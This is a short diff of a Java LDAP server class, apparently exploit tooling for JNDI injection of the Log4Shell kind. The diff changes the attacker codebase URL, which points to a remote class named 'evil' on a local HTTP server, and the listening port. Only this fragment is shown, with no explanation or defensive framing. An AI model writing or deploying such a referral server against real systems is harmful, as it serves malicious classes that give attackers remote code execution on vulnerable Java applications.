@@ -18,8 +18,8 @@ import java.net.URL;
 public class LdapServer {
     private static final String LDAP_BASE = "dc=example,dc=com";
     public static void main (String[] args) {
-        String url = "http://127.0.0.1:8000/#evilObject";
-        int port = 1234;
+        String url = "http://127.0.0.1:8000/#evil";
+        int port = 1333;
         try {
             InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
             config.setListenerConfigs(new InMemoryListenerConfig(
